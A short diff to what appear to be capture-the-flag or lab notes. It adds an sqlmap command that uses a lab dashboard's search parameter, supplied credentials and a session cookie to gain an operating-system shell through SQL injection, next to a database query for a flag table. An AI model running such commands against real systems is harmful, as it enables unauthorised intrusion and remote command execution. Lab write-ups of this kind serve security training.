@@ -41,5 +41,8 @@ psql -h [host] -U [username] -p [port]
 SELECT * from flagtable;
 ```
 
+* sqlmap
 
-
+```
+sqlmap -u "http://10.129.29.196/dashboard.php?search=meta" --auth-cred "admin:qwerty789" --auth-type="basic" --cookie="PHPSESSID=3umpj9dhgherekvdg17nlj843o" --os-shell
+```
